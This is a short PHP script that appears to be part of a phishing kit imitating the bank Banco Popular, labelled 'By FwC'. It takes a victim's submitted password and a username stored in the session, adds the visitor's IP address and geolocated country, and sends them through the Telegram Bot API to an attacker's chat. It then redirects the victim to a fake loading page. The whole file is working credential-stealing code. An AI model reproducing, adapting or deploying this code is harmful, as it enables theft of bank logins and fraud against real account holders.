<?php
session_start();

$_SESSION['sess4'] = $_POST['bt2'];

ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

require 'ashe.php';

if ( isset ($_POST['bt2']) ){

$flowcabimas =  "🏦<b>Bp Popular | By FwC</b>\n".
				"✔Usuario: ".$_SESSION['sess1']."\n".
				"✔Clave: ".$_POST['bt2']."\n".
				"➖\n".
				"🌐 ".$userp."\n".
				"📍 ".$pais."\n";


$flowcabimas = urlencode($flowcabimas);
$result = @file_get_contents("https://api.telegram.org/bot$tkfwc/sendMessage?chat_id=$fwchat_id&text=$flowcabimas&parse_mode=html");

Header ("Location: ../loading-fwc.html");
}
?>
